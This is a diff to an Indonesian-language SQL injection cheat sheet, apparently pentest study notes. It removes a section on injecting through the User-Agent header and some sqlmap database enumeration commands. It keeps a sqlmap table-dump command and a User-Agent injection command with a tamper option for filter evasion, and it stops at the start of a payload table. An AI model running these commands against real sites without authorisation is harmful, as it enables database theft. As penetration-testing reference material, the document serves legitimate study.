@@ -22,25 +22,11 @@
 3. Coba generate error pada entry point/parameter yang sudah dikumpulkan pada langkah sebelumnya menggunakan `'` (digunakan untuk memisahkan string) dan `;` (digunakan untuk mengakhiri kueri SQL)
 4. Coba meng-injek payload tanpa break query, bisa mengguna comment
 
-
-## Celah Injection
-- Header
-    - User-agent
-      ```
-      sqlmap -u 'http://google.com' -p user-agent --user-agent=elseagent --technique=B --banner
-      sqlmap -u 'http://google.com' -p user-agent --random-agent --technique=U --tamper=space2comment --suffix=';#' union-char=els --banner //Digunakan jika server blok spasi dan menggunakan commen '#'
-      ```
-- Parameter GET
-- Parameter POST
-
 ## SQLMap
-- Menggali isi DB
-    ```
-    sqlmap -u 'http://google.com' --current-db
-    sqlmap -u 'http://google.com' -D <namaDB> --tables
-    sqlmap -u 'http://google.com' -D <nameDB> -T <namaTable> --columns
+```
     sqlmap -u 'http://google.com' -D <nameDB> -T <namaTable> --dump
-    ```
+    sqlmap -u 'http://google.com' -p user-agent --random-agent --technique=U --tamper=space2comment --suffix=';#' union-char=els --banner //Digunakan jika server blok spasi dan menggunakan commen '#'
+```
 
 ## Payload
 |Payload|Payload alternatif|
